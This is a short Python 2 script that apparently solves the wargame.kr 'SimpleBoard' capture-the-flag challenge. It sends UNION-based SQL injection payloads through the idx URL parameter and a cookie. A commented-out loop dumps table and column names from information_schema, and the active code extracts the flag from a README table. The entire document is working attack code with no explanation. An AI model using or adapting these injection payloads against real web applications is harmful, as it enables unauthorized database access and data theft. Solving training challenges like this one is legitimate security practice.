#-*- coding:utf8 -*-

import urllib2, urllib, time

WEB_USER_AGENT = 'Mozilla'

url = "http://wargame.kr:8080/SimpleBoard/read.php?idx={}"

def getRequest(view, show=True):
    global url
    
    view = urllib.quote(view)
    if show:
        print "URL :",url.format(view)
        print "view :",view
        print "Cookie :","view=/" + view
    
    req = urllib2.Request(url.format(view))
    req.add_header("Cookie","view=/" + view)
    return req

def getPage(req):
    return urllib2.urlopen(req).read()
"""    
for i in range(100):
    req = getRequest("5 union all select table_name,table_type,3,4 from Information_schema.tables limit {},1#".format(i), show=False)
    page = getPage(req)
    data = page[page.find("<tr><td>NUM</td><td>TITLE</td><td>HIT</td></tr>\n\t\t<tr><td>")+58:page.find("</td><td>3</td></tr>")].split("</td><td>")
    
    if data[0] == "":
        break
    print "-"*36
    print "[*] table_name :",data[0]
    print "[*] table_type :",data[1]
    
    for j in range(0,100):
        req = getRequest("5 union all select column_name,2,3,4 from Information_schema.columns where table_name={} limit {},1#".format("0x"+data[0].encode('hex'),j), show=False)
        page = getPage(req)
        #print page
        #print page.find("<tr><td>NUM</td><td>TITLE</td><td>HIT</td></tr>\n\t\t<tr><td>")+58,page.find("</td><td>2")
        tmp = page[page.find("<tr><td>NUM</td><td>TITLE</td><td>HIT</td></tr>\n\t\t<tr><td>")+58:page.find("</td><td>2")]
        #print "TMP",tmp
        if tmp.find("view") != -1: break
        print "\t[*] column_name :", tmp
    print "-"*36
    print "\n"
"""

req = getRequest("5 union select flag,2,3,4 from README#",show=False)
page = getPage(req)
data = page[page.find("<tr><td>NUM</td><td>TITLE</td><td>HIT</td></tr>\n\t\t<tr><td>")+58:page.find("</td><td>2")]
print "FLAG :",data